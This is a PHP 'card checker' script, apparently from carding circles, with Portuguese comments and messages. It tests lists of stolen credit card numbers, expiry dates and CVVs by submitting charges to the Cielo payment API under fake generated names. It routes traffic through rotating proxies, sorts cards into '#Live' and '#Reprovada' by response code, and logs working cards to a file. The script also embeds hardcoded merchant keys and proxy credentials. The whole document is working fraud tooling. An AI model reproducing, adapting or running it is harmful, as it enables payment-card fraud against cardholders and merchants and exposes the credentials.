<?php

//header('content-type: application/json');
error_reporting(0);
set_time_limit(0);

list($card, $mes, $ano, $cvv) = explode("|", str_replace(array(",", "»", "|", ":"), "|", $_REQUEST['lista']));

$bin1 = substr($card, 0, 6); 
$file = 'bins.csv'; 
$searchfor = $bin1; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
    $encontrada = implode("\n", $matches[0]); 
} 
$pieces = explode(";", $encontrada); 
$c = count($pieces); 
if ($c == 8) { 
    $pais = $pieces[4]; 
    $paiscode = $pieces[5]; 
    $banco = $pieces[2]; 
    $level = $pieces[3]; 
    $bandeira = $pieces[1]; 
} else { 
    $pais = $pieces[5]; 
    $paiscode = $pieces[6]; 
    $link = $pieces[7]; 
    $level = $pieces[4]; 
    $banco = $pieces[2]; 
    $bandeira = $pieces[1]; 
}

//unlink("cookie.txt");

function request($url, $post = false, $header = false)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_PROXY, $proxy); 
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  if ($post) {
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
  }
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
  if ($header) {
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
  }
  $exec = curl_exec($ch);
  return $exec;
}

switch ($mes) {
    case '1': $mes = '01';
        break;
    case '4': $mes = '04';
        break;
    case '7': $mes = '07';
        break;
    case '2': $mes = '02';
        break;
    case '5': $mes = '05';
        break;
    case '8': $mes = '08';
        break;
    case '3': $mes = '03';
        break;
    case '6': $mes = '06';
        break;
    case '9': $mes = '09';
        break;

}
switch ($ano) {
         case '19':$ano = '2019';break;
         case '20':$ano = '2020';break;
         case '21':$ano = '2021';break;
         case '22':$ano = '2022';break;
         case '23':$ano = '2023';break;
         case '24':$ano = '2024';break;
         case '25':$ano = '2025';break;
         case '26':$ano = '2026';break;
         case '27':$ano = '2027';break;
         case '28':$ano = '2028';break;
 

}

$x = request("https://www.4devs.com.br/ferramentas_online.php", 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=PB&txt_qtde=1&cep_cidade=', array(
  "host: www.4devs.com.br",
  "origin: https://www.4devs.com.br",
  "referer: https://www.4devs.com.br/gerador_de_pessoas",
  "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
));

$nome = json_decode($x, true)['nome'];

$proxy = curl_exec($ch);
    $username = 'xsoqlhle-rotate';
    $password = 'h9xxzoo8k4bh';
    $session = mt_rand();
    $proxy = 'p.webshare.io:80:';
	
$chaves = ["1" => ["key1" => "e25579d7-1ffd-4dcb-a00f-3c87d973c292", "key" => "ZBVJHUIPJEIETGLRIAZCKYWQSNQMYMDPRIRKYRNU"]]; # TROQUE AQUI A KEY E O MERCHANT ID

$arrayKeys = array_rand($chaves);
$merchantid = $chaves[$arrayKeys]['key1'];
$merchantkey = $chaves[$arrayKeys]['key'];

$numerokey = array_rand($chaves);

$post = '{
   "MerchantOrderId":"9524941246",
   "Payment":{
     "Type":"CreditCard",
     "Amount":"100",
     "Installments":1,
     "SoftDescriptor":"Juliete 13x14",
     "CreditCard":{
         "CardNumber":"'.$card.'",
         "Holder":"'.$nome.'",
         "ExpirationDate":"'.$mes.'/'.$ano.'",
         "SecurityCode":"'.$cvv.'",
         "Brand":"Elo"
     }
   }
}';

echo $d1 = request("https://api.cieloecommerce.cielo.com.br/1/sales", $post, array(
  'MerchantId: '.$merchantid,
  'MerchantKey: '.$merchantkey,
  'Content-Type: application/json'
));

$json = json_decode($d1, true);

//print_r($json);

if($json['Payment']['ReturnMessage'] === "Transacao autorizada") {
  echo json_encode(array("status" => 0, "msg" => "#Live $mes $mes $ano $cvv - $bandeira $banco $level $pais ($paiscode) $link - ({$json['Payment']['ReturnCode']}) {$json['Payment']['ReturnMessage']} - Chave $arrayKeys<br>"));
 $file = fopen("metralhadasFuuLCaRAI.html", "a");       
 fwrite($file, "CX2- FUUL | CC: $mes $mes  $ano  $cvv  | BANDEIRA: $bandeira  | BANCO: $banco  $level  $pais </br>");
} else if ($json['Payment']['ReturnCode'] === "GD") {
  echo json_encode(array("status" => 2, "msg" => "#Reprovada $card $mes $ano $cvv - $bandeira $banco $level $pais ($paiscode) $link - ({$json['Payment']['ReturnCode']}) {$json['Payment']['ReturnMessage']} - Chave $arrayKeys<br>"));

} else if ($json['Payment']['ReturnCode'] === "BP171") {
  echo json_encode(array("status" => 2, "msg" => "#Reprovada $card $mes $ano $cvv - $bandeira $banco $level $pais ($paiscode) $link - ({$json['Payment']['ReturnCode']}) {$json['Payment']['ReturnMessage']} - Chave $arrayKeys<br>"));

} else if ($json['Payment']['ReturnCode'] === "N7") {
echo json_encode(array("status" => 2, "msg" => "#Reprovada $card $mes $ano $cvv - $bandeira $banco $level $pais ($paiscode) $link - ({$json['Payment']['ReturnCode']}) [Código Segurança inválido]  - Chave $arrayKeys<br>"));

 } else if ($json['Payment']['ReturnCode'] === "57") {
  echo json_encode(array("status" => 2, "msg" => "#Reprovada $card $mes $ano $cvv - $bandeira $banco $level $pais ($paiscode) $link - ({$json['Payment']['ReturnCode']}) [Transação não permitida]  - Chave $arrayKeys<br>"));

} else if ($json['Payment']['ReturnCode'] === "43") {
echo json_encode(array("status" => 2, "msg" => "#Reprovada $card $mes $ano $cvv - $bandeira $banco $level $pais ($paiscode) $link - ({$json['Payment']['ReturnCode']}) [Cartão bloqueado por roubo.]  - Chave $arrayKeys<br>"));

  } else if ($json['Payment']['ReturnCode'] === "51") {
  echo json_encode(array("status" => 2, "msg" => "#Reprovada $card $mes $ano $cvv - $bandeira $banco $level $pais ($paiscode) $link - ({$json['Payment']['ReturnCode']}) [Saldo insuficiente]  - Chave $arrayKeys<br>"));

} else if ($json['Payment']['ReturnCode'] === "GA") {
echo json_encode(array("status" => 2, "msg" => "#Reprovada $card $mes $ano $cvv - $bandeira $banco $level $pais ($paiscode) $link - ({$json['Payment']['ReturnCode']}) [Transação referida pela Cielo]  - Chave $arrayKeys<br>"));


} else if ($json[0]['Message']) {
  echo json_encode(array("status" => 1, "msg" => "#Reprovada $card $mes $ano $cvv - $bandeira $banco $level $pais ($paiscode) $link - ({$json[0]['Message']}) - Chave $arrayKeys<br>"));
} else {
  echo json_encode(array("status" => 1, "msg" => "#Reprovada $card $mes $ano $cvv - $bandeira $banco $level $pais ($paiscode) $link - ({$json['Payment']['ReturnCode']}) {$json['Payment']['ReturnMessage']} - Chave $arrayKeys<br>"));

}
